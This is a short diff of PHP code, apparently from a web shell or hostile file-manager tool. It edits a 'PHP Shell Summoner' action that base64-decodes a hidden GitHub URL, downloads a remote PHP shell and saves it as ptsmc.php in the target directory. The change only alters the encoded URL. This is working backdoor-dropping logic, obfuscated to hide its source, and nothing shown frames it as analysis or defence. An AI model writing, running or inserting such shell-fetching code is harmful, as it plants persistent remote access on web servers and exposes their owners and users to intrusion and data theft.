@@ -409,7 +409,7 @@ if (isset($_POST['action'])) {
             
             // [NEW FEATURE v8.1] PHP Shell Summoner Logic
             case 'summon_ptsmc':
-                $url_shell = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xlbnVtaWNhcHRzbWMvcHRzbWMtZ3JvdXAvcmVmcy9oZWFkcy9tYWluL3B0c21jLnBocA==');
+                $url_shell = base64_decode('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL2xlbnVtaWNhcHRzbWMvcHRzbWMtZ3JvdXAvcmVmcy9oZWFkcy9tYWluL3B0c21j');
                 $response = fetch_and_save_shell($url_shell, $dir, 'ptsmc.php');
                 break;
                 
